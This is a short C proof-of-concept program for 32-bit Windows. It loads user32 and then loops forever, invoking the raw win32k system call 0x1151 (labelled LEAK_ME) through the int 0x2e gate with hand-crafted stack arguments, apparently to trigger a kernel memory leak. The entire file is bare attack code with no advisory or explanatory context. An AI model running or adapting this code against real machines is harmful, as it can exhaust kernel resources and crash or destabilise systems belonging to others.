#include <windows.h>
#define LEAK_ME 0x1151
int main(int argc, char *argv[])
{
    /* get us some win32k! */
    LoadLibrary("user32");
    while (1) {
        __asm {
           mov eax, LEAK_ME
           push 0
           push 0
           push 4
           lea edx, dword ptr [esp]
           int 0x2e
        }
     }
}

